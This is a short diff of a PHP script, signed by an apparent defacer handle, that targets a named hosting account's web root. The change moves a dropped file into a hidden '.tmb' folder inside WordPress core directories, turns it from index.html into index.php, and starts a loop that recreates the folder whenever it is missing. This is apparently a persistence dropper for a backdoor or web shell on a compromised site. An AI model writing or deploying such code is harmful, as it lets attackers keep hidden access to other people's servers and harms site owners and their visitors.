@@ -1,9 +1,9 @@
 // code by root@x-krypt0n-x : system of pekalongan
 <?php
-$dir = '/home/ptrpvokasi/public_html/';
-$folderName = '-';
+$dir = '/home/ptrpvokasi/public_html/wp-includes/Text/Diff/Engine/-/';
+$folderName = '.tmb';
 $folderPath = $dir . '/' . $folderName;
-$indexFile = 'index.html';
+$indexFile = 'index.php';
 
 while (true) {
   if (!file_exists($folderPath)) {
